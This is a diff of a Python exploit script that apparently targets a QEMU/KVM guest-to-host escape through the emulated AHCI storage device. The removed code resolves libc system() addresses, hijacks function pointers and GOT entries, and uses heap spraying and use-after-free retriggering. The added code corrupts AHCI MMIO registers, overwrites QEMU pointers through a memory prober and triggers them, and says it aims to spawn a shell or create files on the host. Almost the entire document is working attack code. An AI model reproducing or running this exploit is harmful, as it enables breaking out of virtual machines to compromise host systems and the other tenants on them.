+            log_success(f"Found potential system @ 0x{qemu_system_addr:016x}")
+            
+            # Overwrite pointer
+            if self.kvm_prober.write_qword(target_addr, qemu_system_addr):
+                log_success(f"Overwritten pointer at 0x{target_addr:x}")
+                
+                # Now trigger the function
+                return self.trigger_corrupted_function()
         
         return False
     
-    def guess_pointer_type(self, addr: int) -> str:
-        """Guess what type of function a pointer points to"""
-        if 0x550000000000 <= addr < 0x560000000000:
-            return "QEMU function"
-        elif 0x7f0000000000 <= addr < 0x7fffffffffff:
-            # Check for common libc function patterns
-            low_bits = addr & 0xFFF
-            common_libc_patterns = {
-                0x490: "system",
-                0x290: "execve", 
-                0x420: "popen",
-                0x8e0: "malloc",
-                0x4e0: "free",
-                0x2a0: "execv",
-                0x770: "mmap",
-                0x6a0: "memcpy",
-            }
-            for pattern, name in common_libc_patterns.items():
-                if abs(low_bits - pattern) < 0x100:
-                    return f"libc {name}"
-            return "libc function"
-        elif 0xffff800000000000 <= addr < 0xffffffffffffffff:
-            return "kernel function"
+    def find_qemu_system(self) -> Optional[int]:
+        """Try to find system() or similar in QEMU memory"""
+        # QEMU might use libc's system() via dlsym
+        # Or have its own command execution
         
-        return "unknown"
-    
-    def pointer_confidence(self, addr: int) -> int:
-        """Rate confidence that this is a useful function pointer"""
-        confidence = 0
+        # Try common offsets from QEMU base
+        qemu_base = 0x555555554000  # Common QEMU base
         
-        if 0x7f0000000000 <= addr < 0x7fffffffffff:
-            confidence += 50  # libc pointers are very useful
-        
-        if 0x550000000000 <= addr < 0x560000000000:
-            confidence += 30  # QEMU pointers are useful
-        
-        # Check for common function endings
-        low_bits = addr & 0xFFF
-        common_endings = [0x490, 0x290, 0x420, 0x8e0, 0x4e0]
-        for ending in common_endings:
-            if abs(low_bits - ending) < 0x100:
-                confidence += 20
-        
-        return confidence
-    
-    def calculate_system_address(self) -> Optional[int]:
-        """Calculate system() address using discovered offsets"""
-        if 'libc_base' in self.leaked:
-            libc_base = self.leaked['libc_base']
-        elif 'libc_ptr' in self.leaked:
-            # Try to deduce libc base from pointer
-            libc_ptr = self.leaked['libc_ptr']
-            
-            # Use the offsets you found as fallbacks
-            common_system_offsets = [
-                0x4c490,    # Your found offset 1
-                0x145200,   # Your found offset 2
-                0x52290,    # Common Ubuntu 22.04
-                0x50d60,    # Common Debian 11
-            ]
-            
-            # Try each offset to find plausible base
-            for offset in common_system_offsets:
-                if libc_ptr > offset:
-                    base_candidate = libc_ptr - offset
-                    # Check if base is page-aligned
-                    if (base_candidate & 0xFFF) == 0:
-                        libc_base = base_candidate
-                        self.leaked['libc_base'] = libc_base
-                        log_info(f"Deduced libc base 0x{libc_base:016x} using offset 0x{offset:x}")
-                        break
-            else:
-                # Default to page alignment
-                libc_base = libc_ptr & 0xffffffffff000000
-                self.leaked['libc_base'] = libc_base
-        else:
-            log_error("No libc pointer found")
-            return None
-        
-        # Try multiple system offsets (prioritizing your found ones)
-        system_offsets = [
-            0x4c490,    # Your first found offset
-            0x145200,   # Your second found offset
-            0x52290,    # Fallback 1
-            0x50d60,    # Fallback 2
-            0x55410,    # Fallback 3
-            0x4f420,    # Fallback 4
+        # These are guesses - you'd need to analyze QEMU binary
+        possible_offsets = [
+            0x10000, 0x20000, 0x30000, 0x40000,
+            0x50000, 0x60000, 0x70000, 0x80000,
         ]
         
-        for offset in system_offsets:
-            system_addr = libc_base + offset
-            log_info(f"Trying system() @ 0x{system_addr:016x} (offset 0x{offset:x})")
-            
-            # Quick sanity check - system() should be in libc text segment
-            if 0x7f0000000000 <= system_addr < 0x7fffffffffff:
-                self.leaked['system_addr'] = system_addr
-                return system_addr
+        for offset in possible_offsets:
+            addr = qemu_base + offset
+            # Read a few bytes to see if it looks like code
+            data = self.kvm_prober.read(addr, 16)
+            if data and b'\x55\x48\x89\xe5' in data:  # push rbp; mov rbp, rsp
+                log_info(f"Found code at 0x{addr:x}")
+                return addr
         
-        log_error("Could not calculate valid system() address")
         return None
     
-    def overwrite_function_pointer(self, ptr_info: Dict, system_addr: int, cmd_addr: int) -> bool:
-        """Overwrite a function pointer with system() address"""
-        target_addr = ptr_info['address']
+    def trigger_corrupted_function(self) -> bool:
+        """Trigger the corrupted function pointer"""
+        log_info("Triggering corrupted function...")
         
-        log_info(f"Attempting to overwrite function pointer at 0x{target_addr:016x}")
-        log_info(f"  Original value: 0x{ptr_info['value']:016x}")
-        log_info(f"  New value: 0x{system_addr:016x}")
+        # Try various ways to trigger:
         
-        # Write the new pointer value
-        if not self.guest_mem.write_qword(target_addr, system_addr):
-            log_error(f"Failed to overwrite pointer at 0x{target_addr:016x}")
-            return False
+        # 1. Trigger AHCI interrupt
+        self.write_mmio(0x110, 0xFFFFFFFF)  # Set all interrupt bits
+        time.sleep(0.1)
         
-        # Verify the write
-        verify = self.guest_mem.read_qword(target_addr)
-        if verify == system_addr:
-            log_success(f"Successfully overwritten pointer at 0x{target_addr:016x}")
-            
-            # For system() calls, we need to set up RDI = cmd_addr
-            # Try to find/set up argument if possible
-            self.setup_system_argument(target_addr, cmd_addr)
-            
-            return True
-        else:
-            log_error(f"Write verification failed at 0x{target_addr:016x}")
-            if verify:
-                log_error(f"Expected: 0x{system_addr:016x}, Got: 0x{verify:016x}")
-            return False
+        # 2. Issue command
+        self.write_mmio(0x138, 0x1)
+        time.sleep(0.1)
+        
+        # 3. Reset port (might trigger cleanup functions)
+        cmd = self.read_mmio(0x118)
+        if cmd:
+            self.write_mmio(0x118, cmd & ~0x1)  # Clear ST bit
+            time.sleep(0.1)
+            self.write_mmio(0x118, cmd | 0x1)   # Set ST bit
+        
+        log_success("Trigger attempted")
+        return True
     
-    def setup_system_argument(self, func_ptr_addr: int, cmd_addr: int):
-        """Attempt to set up argument for system() call"""
-        log_info(f"Setting up system() argument: RDI = 0x{cmd_addr:016x}")
+    def run_simple_test(self):
+        """Run simple test - corrupt registers and see what happens"""
+        log_info("Running simple corruption test")
         
-        # Try different strategies based on what we're overwriting
+        # Save original values
+        original = {}
+        for offset in [0x100, 0x104, 0x108, 0x10C, 0x110, 0x118, 0x128, 0x138]:
+            val = self.read_mmio(offset)
+            if val is not None:
+                original[offset] = val
         
-        # Strategy 1: If overwriting a timer callback, check timer struct
-        # Timer callbacks often have the argument at a fixed offset
-        timer_arg_offset = 0x30  # Common offset for timer callback argument
+        # Corrupt
+        self.corrupt_ahci_state()
         
-        # Strategy 2: If overwriting a function pointer in an object,
-        # the object pointer itself might be in RDI/RBX
+        # Wait and observe
+        log_info("Waiting 3 seconds to observe effects...")
+        time.sleep(3)
         
-        # Strategy 3: Look for nearby pointers we can overwrite
-        # to control arguments
+        # Restore (optional)
+        log_info("Restoring original values...")
+        for offset, val in original.items():
+            self.write_mmio(offset, val)
         
-        # For now, log what we're attempting
-        log_info("Argument setup strategies:")
-        log_info("  1. If timer callback, argument at offset 0x30")
-        log_info("  2. If object method, 'this' pointer in RDI")
-        log_info("  3. May need ROP chain for full control")
-        
-        # Try to find a place to store the command pointer
-        # Look for null pointers near the function pointer we can overwrite
-        for offset in [-0x20, -0x18, -0x10, 0x8, 0x10, 0x18, 0x20]:
-            check_addr = func_ptr_addr + offset
-            current = self.guest_mem.read_qword(check_addr)
-            if current == 0 or current == 0x4141414141414141 or current == 0x4242424242424242:
-                # This looks like unused/controlled memory
-                if self.guest_mem.write_qword(check_addr, cmd_addr):
-                    log_success(f"Set argument pointer at 0x{check_addr:016x} -> 0x{cmd_addr:016x}")
-                    return True
-        
-        log_warning("Could not set up argument automatically - may need manual ROP")
+        log_info("Test complete - check for QEMU crashes or unexpected behavior")
     
-    def fallback_exploit(self, cmd_addr: int) -> bool:
-        """Fallback exploitation strategies"""
-        log_info("Trying fallback exploitation strategies...")
-        
-        # Strategy 1: Direct memory corruption
-        # Look for critical QEMU structures we might have corrupted
-        
-        # Strategy 2: Try to find and overwrite GOT entries
-        if 'libc_base' in self.leaked:
-            libc_base = self.leaked['libc_base']
-            
-            # Common GOT entries that might be in corrupted heap area
-            got_targets = [
-                ('free', 0x8e0),      # free@got.plt
-                ('malloc', 0x8e0),    # malloc@got.plt  
-                ('realloc', 0x8e0),   # realloc@got.plt
-                ('calloc', 0x8e0),    # calloc@got.plt
-            ]
-            
-            system_addr = self.calculate_system_address()
-            if system_addr:
-                log_info(f"Attempting to overwrite GOT entries with system() @ 0x{system_addr:016x}")
-                # This would require finding GOT in memory
-        
-        # Strategy 3: Heap Feng Shui - rearrange heap for better control
-        log_info("Attempting heap feng shui...")
-        
-        # Allocate more chunks to try to get better positioning
-        additional_chunks = []
-        for i in range(100):
-            addr = self.guest_mem.alloc(self.chunk_size)
-            if addr:
-                additional_chunks.append(addr)
-                # Write recognizable pattern
-                self.guest_mem.write_qword(addr, 0x4847464544434241)  # ABCDEFGH
-        
-        log_info(f"Allocated {len(additional_chunks)} additional chunks")
-        
-        # Strategy 4: Try to trigger use-after-free
-        log_info("Attempting to trigger use-after-free...")
-        
-        # Re-trigger vulnerability multiple times
-        for i in range(3):
-            log_info(f"Re-trigger attempt {i+1}/3")
-            if self.trigger_vulnerability():
-                # Check if we got better leaks
-                new_leak = self.scan_for_leak()
-                if new_leak:
-                    log_success(f"Got new leak on re-trigger: 0x{new_leak:016x}")
-                    # Try exploitation again with new leak
-                    return self.execute_payload()
-        
-        log_error("All fallback strategies failed")
-        log_info("Manual exploitation required:")
-        log_info("  1. Use kvm_prober to examine corrupted heap areas")
-        log_info("  2. Look for vtables, GOT entries, or function pointers")
-        log_info("  3. Craft specific overwrite for found targets")
-        log_info("  4. Consider ROP chain if direct overwrite not possible")
-        
-        return False
-
     def run_exploit(self) -> bool:
         """Main exploit execution"""
         log_info("=" * 60)
-        log_info("STARTING AHCI EXPLOIT")
+        log_info("DIRECT AHCI MMIO EXPLOIT")
         log_info("=" * 60)
-
-        # Setup
+        
         if not self.setup():
             return False
-
-        # Heap spray
-        chunks = self.spray_heap()
-        if not chunks:
-            log_error("Failed to spray heap")
-            return False
-
-        # Trigger vulnerability
-        triggered = False
-        for attempt in range(self.retry_count):
-            log_info(f"Trigger attempt {attempt + 1}/{self.retry_count}")
-
-            if self.trigger_vulnerability():
-                triggered = True
-                break
-            time.sleep(0.5)
-
-        if not triggered:
-            log_error("Failed to trigger vulnerability")
-            return False
-
-        # Scan for leak
-        leak = self.scan_for_leak()
-        if not leak:
-            log_error("Failed to find heap leak")
-            log_info("This could mean:")
-            log_info("1. The vulnerability wasn't triggered correctly")
-            log_info("2. Spray didn't land in the right place")
-            log_info("3. QEMU version is not vulnerable")
-            return False
-
-        # Hijack control flow
-        if not self.hijack_control():
-            log_warning("Control flow hijack may not work")
-
-        # Attempt to execute payload
-        self.execute_payload()
-
+        
+        # Try different approaches
+        log_info("\n[1] Simple corruption test")
+        self.run_simple_test()
+        
+        log_info("\n[2] Malicious DMA setup")
+        self.setup_malicious_dma()
+        
+        log_info("\n[3] Control hijack attempt")
+        self.attempt_control_hijack()
+        
         log_success("Exploit sequence completed!")
-        log_info("If successful, you should see a file /tmp/exploit_success on host")
+        log_info("Check for:")
+        log_info("  - QEMU process crash/strange behavior")
+        log_info("  - Shell spawned from QEMU process")
+        log_info("  - Files created on host")
+        
         return True
 
-    def test_trigger_only(self) -> bool:
-        """Test only the vulnerability trigger"""
-        log_info("Testing vulnerability trigger...")
-
-        if not self.setup():
-            return False
-
-        chunks = self.spray_heap()
-        if not chunks:
-            return False
-
-        return self.trigger_vulnerability()
-
-    def cleanup(self):
-        """Clean up resources"""
-        # kvm_prober doesn't need explicit cleanup
-        log_info("Cleanup completed")
+# Update main() to use this
+def main():
+    args = parse_args()
+    
+    log_info("DIRECT AHCI MMIO Exploit")
+    log_info(f"Target: AHCI MMIO @ 0xfea0e000")
+    
+    exploit = DirectAHCIExploit(args.kvm_prober)
+    if args.debug:
+        exploit.set_debug(True)
+    
+    try:
+        success = exploit.run_exploit()
+        if success:
+            log_success("Exploit completed")
+        else:
+            log_error("Exploit failed")
+    except Exception as e:
+        log_error(f"Error: {e}")
+        import traceback
+        traceback.print_exc()
 
 # ============================================================================
 # COMMAND LINE INTERFACE
